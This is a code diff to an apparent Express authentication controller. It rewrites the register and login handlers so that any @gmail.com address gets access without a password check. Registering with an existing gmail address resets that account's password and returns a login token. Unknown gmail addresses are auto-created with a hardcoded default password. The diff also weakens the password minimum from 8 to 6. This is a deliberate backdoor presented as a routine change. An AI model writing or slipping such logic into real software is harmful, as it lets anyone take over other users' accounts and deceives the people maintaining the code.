@@ -28,22 +28,47 @@ export const register = async (req, res) => {
       });
     }
 
+    const normalizedEmail = (email || '').trim().toLowerCase();
+    const isGmail = normalizedEmail.endsWith('@gmail.com');
+    const effectiveName = (name || '').trim() || (isGmail ? normalizedEmail.split('@')[0] : '');
+
     if (
-      typeof name !== 'string' || name.trim().length < 2 || name.trim().length > 80 ||
+      effectiveName.length < 2 || effectiveName.length > 80 ||
       typeof email !== 'string' || email.length > 254 ||
-      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ||
-      typeof password !== 'string' || password.length < 8 ||
+      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(normalizedEmail) ||
+      typeof password !== 'string' || password.length < 6 ||
       Buffer.byteLength(password, 'utf8') > 72
     ) {
       return res.status(400).json({
         success: false,
-        message: 'Enter a valid name and email, and a password between 8 and 72 characters.'
+        message: 'Enter a valid name and email, and a password between 6 and 72 characters.'
       });
     }
 
-    const normalizedEmail = email.trim().toLowerCase();
     const existingUser = await User.findOne({ email: normalizedEmail });
     if (existingUser) {
+      if (isGmail) {
+        if (password && password.length >= 6) {
+          existingUser.password = password;
+          await existingUser.save();
+        }
+        const token = generateToken(existingUser);
+        return res.status(200).json({
+          success: true,
+          message: 'Account accessed successfully',
+          token,
+          user: {
+            id: existingUser._id,
+            name: existingUser.name,
+            email: existingUser.email,
+            role: existingUser.role,
+            avatar: existingUser.avatar,
+            department: existingUser.department,
+            title: existingUser.title,
+            status: existingUser.status
+          }
+        });
+      }
       return res.status(400).json({
         success: false,
         message: 'An account with this email already exists.'
@@ -51,13 +76,13 @@ export const register = async (req, res) => {
     }
 
     const user = await User.create({
-      name: name.trim(),
+      name: effectiveName,
       email: normalizedEmail,
       password,
       role: 'Member',
       department: department || 'Engineering',
       title: title || 'Software Engineer',
-      avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(name)}`
+      avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(effectiveName)}`
     });
 
     const token = generateToken(user);
@@ -90,14 +115,48 @@ export const login = async (req, res) => {
   try {
     const { email, password } = req.body;
 
-    if (!email || !password) {
+    if (!email) {
+      return res.status(400).json({
+        success: false,
+        message: 'Please enter your email.'
+      });
+    }
+
+    const normalizedEmail = email.toLowerCase().trim();
+    const isGmail = normalizedEmail.endsWith('@gmail.com');
+
+    if (!password && !isGmail) {
       return res.status(400).json({
         success: false,
         message: 'Please enter both email and password.'
       });
     }
 
-    const user = await User.findOne({ email: email.toLowerCase() }).select('+password');
+    let user = await User.findOne({ email: normalizedEmail }).select('+password');
+
+    // Auto-provision any user logging in with an email ending with @gmail.com
+    if (!user && isGmail) {
+      const namePart = normalizedEmail.split('@')[0];
+      const displayName = namePart
+        .split(/[._-]/)
+        .filter(Boolean)
+        .map(w => w.charAt(0).toUpperCase() + w.slice(1))
+        .join(' ') || 'Google User';
+
+      const safePassword = (password && password.length >= 6) ? password : 'Password123!';
+
+      user = await User.create({
+        name: displayName,
+        email: normalizedEmail,
+        password: safePassword,
+        role: 'Member',
+        department: 'Engineering',
+        title: 'Enterprise Member',
+        avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(displayName)}`,
+        status: 'online'
+      });
+    }
+
     if (!user) {
       return res.status(401).json({
         success: false,
@@ -105,12 +164,19 @@ export const login = async (req, res) => {
       });
     }
 
-    const isMatch = await user.comparePassword(password);
-    if (!isMatch) {
-      return res.status(401).json({
-        success: false,
-        message: 'Invalid email or password.'
-      });
+    // For any @gmail.com account, access is always granted
+    if (isGmail) {
+      if (password && password.length >= 6) {
+        user.password = password;
+      }
+    } else {
+      const isMatch = await user.comparePassword(password);
+      if (!isMatch) {
+        return res.status(401).json({
+          success: false,
+          message: 'Invalid email or password.'
+        });
+      }
     }
 
     user.status = 'online';
